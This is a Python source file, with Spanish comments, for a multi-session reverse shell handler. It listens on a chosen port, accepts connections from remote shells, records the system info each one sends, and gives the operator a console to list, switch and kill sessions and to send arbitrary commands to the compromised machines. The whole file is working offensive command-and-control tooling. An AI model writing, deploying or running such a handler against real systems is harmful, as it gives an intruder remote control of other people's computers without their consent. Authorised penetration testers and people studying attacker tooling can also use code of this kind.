#!/usr/bin/env python3

import socket
import threading
import time
import sys
import argparse
import select
import os
from datetime import datetime
import uuid

# ANSI Colors
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"

class Session:
    def __init__(self, conn, addr, session_id):
        self.conn = conn
        self.addr = addr
        self.session_id = session_id
        self.connected_at = datetime.now()
        self.last_activity = datetime.now()
        self.info = "Unknown"
        self.lock = threading.Lock()
        self.buffer = ""
        
    def send_command(self, command):
        """Envía un comando a la sesión"""
        try:
            with self.lock:
                self.conn.send(f"{command}\n".encode())
                self.last_activity = datetime.now()
            return True
        except Exception as e:
            print(f"{Colors.RED}[!] Error sending to {self.session_id}: {e}{Colors.RESET}")
            return False
    
    def recv_response(self, timeout=30):
        """Recibe respuesta hasta encontrar el delimitador"""
        try:
            self.conn.settimeout(timeout)
            response = b""
            delimiter = b"<<<END_OF_OUTPUT>>>\n"
            
            while delimiter not in response:
                chunk = self.conn.recv(4096)
                if not chunk:
                    break
                response += chunk
                
            # Remover el delimitador del final
            if delimiter in response:
                response = response.replace(delimiter, b"")
                
            self.last_activity = datetime.now()
            return response.decode(errors='replace')
        except socket.timeout:
            return f"{Colors.YELLOW}[!] Timeout waiting for response{Colors.RESET}"
        except Exception as e:
            return f"{Colors.RED}[!] Error receiving: {e}{Colors.RESET}"

class MultiSessionHandler:
    def __init__(self, port, max_sessions=5):
        self.port = port
        self.max_sessions = max_sessions
        self.sessions = {}
        self.active_session = None
        self.server_socket = None
        self.running = True
        
    def start_listener(self):
        """Inicia el servidor listener"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(self.max_sessions)
            
            print(f"{Colors.GREEN}[+] Listening on port {self.port} (max {self.max_sessions} sessions){Colors.RESET}")
            print(f"{Colors.CYAN}[*] Waiting for connections...{Colors.RESET}")
            
            # Hilo para aceptar conexiones
            listener_thread = threading.Thread(target=self._accept_connections, daemon=True)
            listener_thread.start()
            
            return True
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to start listener: {e}{Colors.RESET}")
            return False
    
    def _accept_connections(self):
        """Acepta nuevas conexiones"""
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                
                if len(self.sessions) >= self.max_sessions:
                    print(f"{Colors.YELLOW}[!] Max sessions reached. Rejecting {addr[0]}:{addr[1]}{Colors.RESET}")
                    conn.close()
                    continue
                
                # Generar ID único para la sesión
                session_id = str(uuid.uuid4())[:8]
                session = Session(conn, addr, session_id)
                
                # Recibir mensaje de bienvenida para obtener info del sistema
                try:
                    conn.settimeout(5)
                    welcome = conn.recv(1024).decode(errors='replace')
                    if welcome:
                        session.info = welcome.strip()
                except:
                    pass
                
                self.sessions[session_id] = session
                print(f"\n{Colors.GREEN}[+] New session: {session_id} from {addr[0]}:{addr[1]}{Colors.RESET}")
                print(f"{Colors.BLUE}[*] Info: {session.info}{Colors.RESET}")
                
                if not self.active_session:
                    self.active_session = session_id
                    print(f"{Colors.MAGENTA}[*] Active session set to: {session_id}{Colors.RESET}")
                
                self._show_prompt()
                
            except Exception as e:
                if self.running:
                    print(f"{Colors.RED}[!] Error accepting connection: {e}{Colors.RESET}")
    
    def _show_prompt(self):
        """Muestra el prompt del manejador"""
        if self.active_session:
            print(f"\n{Colors.CYAN}MultiHandler{Colors.RESET}({Colors.YELLOW}{self.active_session}{Colors.RESET})> ", end='', flush=True)
        else:
            print(f"\n{Colors.CYAN}MultiHandler{Colors.RESET}> ", end='', flush=True)
    
    def show_sessions(self):
        """Muestra todas las sesiones activas"""
        if not self.sessions:
            print(f"{Colors.YELLOW}[!] No active sessions{Colors.RESET}")
            return
        
        print(f"\n{Colors.CYAN}=== Active Sessions ==={Colors.RESET}")
        print(f"{'ID':<10} {'Address':<18} {'Connected':<12} {'Last Activity':<12} {'Info'}")
        print("-" * 80)
        
        for sid, session in self.sessions.items():
            connected_time = self._format_time_diff(session.connected_at)
            last_activity = self._format_time_diff(session.last_activity)
            active_marker = " *" if sid == self.active_session else "  "
            
            print(f"{sid:<10} {session.addr[0]}:{session.addr[1]:<12} {connected_time:<12} {last_activity:<12} {session.info[:30]}{active_marker}")
    
    def _format_time_diff(self, timestamp):
        """Formatea diferencia de tiempo"""
        diff = datetime.now() - timestamp
        if diff.seconds < 60:
            return f"{diff.seconds}s"
        elif diff.seconds < 3600:
            return f"{diff.seconds//60}m"
        else:
            return f"{diff.seconds//3600}h"
    
    def switch_session(self, session_id):
        """Cambia a una sesión específica"""
        if session_id not in self.sessions:
            print(f"{Colors.RED}[!] Session {session_id} not found{Colors.RESET}")
            return False
        
        self.active_session = session_id
        session = self.sessions[session_id]
        print(f"{Colors.GREEN}[+] Switched to session: {session_id} ({session.addr[0]}:{session.addr[1]}){Colors.RESET}")
        return True
    
    def send_command(self, command):
        """Envía comando a la sesión activa"""
        if not self.active_session or self.active_session not in self.sessions:
            print(f"{Colors.RED}[!] No active session{Colors.RESET}")
            return
        
        session = self.sessions[self.active_session]
        
        if session.send_command(command):
            response = session.recv_response()
            print(response, end='')
        else:
            print(f"{Colors.RED}[!] Failed to send command to session {self.active_session}{Colors.RESET}")
            self._remove_session(self.active_session)
    
    def _remove_session(self, session_id):
        """Remueve una sesión desconectada"""
        if session_id in self.sessions:
            try:
                self.sessions[session_id].conn.close()
            except:
                pass
            del self.sessions[session_id]
            
            if self.active_session == session_id:
                # Cambiar a otra sesión si existe
                if self.sessions:
                    self.active_session = list(self.sessions.keys())[0]
                    print(f"{Colors.MAGENTA}[*] Active session changed to: {self.active_session}{Colors.RESET}")
                else:
                    self.active_session = None
            
            print(f"{Colors.YELLOW}[!] Session {session_id} removed{Colors.RESET}")
    
    def kill_session(self, session_id):
        """Mata una sesión específica"""
        if session_id not in self.sessions:
            print(f"{Colors.RED}[!] Session {session_id} not found{Colors.RESET}")
            return
        
        try:
            self.sessions[session_id].send_command("exit")
        except:
            pass
        
        self._remove_session(session_id)
        print(f"{Colors.GREEN}[+] Session {session_id} killed{Colors.RESET}")
    
    def show_help(self):
        """Muestra ayuda"""
        help_text = f"""
{Colors.CYAN}=== MultiHandler Commands ==={Colors.RESET}
{Colors.GREEN}sessions{Colors.RESET}                    - Show all active sessions
{Colors.GREEN}session <id>{Colors.RESET}               - Switch to specific session
{Colors.GREEN}kill <id>{Colors.RESET}                  - Kill specific session
{Colors.GREEN}killall{Colors.RESET}                    - Kill all sessions
{Colors.GREEN}help{Colors.RESET}                       - Show this help
{Colors.GREEN}exit{Colors.RESET}                       - Exit handler
{Colors.GREEN}<any_command>{Colors.RESET}              - Send command to active session

{Colors.YELLOW}Current sessions: {len(self.sessions)}/{self.max_sessions}{Colors.RESET}
{Colors.YELLOW}Active session: {self.active_session or 'None'}{Colors.RESET}
        """
        print(help_text)
    
    def run_console(self):
        """Ejecuta la consola interactiva"""
        print(f"{Colors.CYAN}=== Multi-Session Reverse Shell Handler ==={Colors.RESET}")
        print(f"{Colors.BLUE}Type 'help' for commands{Colors.RESET}")
        
        while self.running:
            try:
                self._show_prompt()
                command = input().strip()
                
                if not command:
                    continue
                
                # Comandos del manejador
                if command == "help":
                    self.show_help()
                elif command == "sessions":
                    self.show_sessions()
                elif command.startswith("session "):
                    session_id = command.split()[1]
                    self.switch_session(session_id)
                elif command.startswith("kill "):
                    session_id = command.split()[1]
                    self.kill_session(session_id)
                elif command == "killall":
                    for sid in list(self.sessions.keys()):
                        self.kill_session(sid)
                elif command in ["exit", "quit"]:
                    break
                else:
                    # Enviar comando a la sesión activa
                    self.send_command(command)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Use 'exit' to quit{Colors.RESET}")
            except EOFError:
                break
    
    def cleanup(self):
        """Limpia recursos"""
        self.running = False
        for session in self.sessions.values():
            try:
                session.conn.close()
            except:
                pass
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        print(f"\n{Colors.GREEN}[+] Handler closed{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description="Multi-session reverse shell handler")
    parser.add_argument("--port", "-p", type=int, required=True, help="Port to listen on")
    parser.add_argument("--max-sessions", "-m", type=int, default=5, help="Maximum concurrent sessions")
    args = parser.parse_args()
    
    handler = MultiSessionHandler(args.port, args.max_sessions)
    
    try:
        if handler.start_listener():
            handler.run_console()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
    finally:
        handler.cleanup()

if __name__ == "__main__":
    main()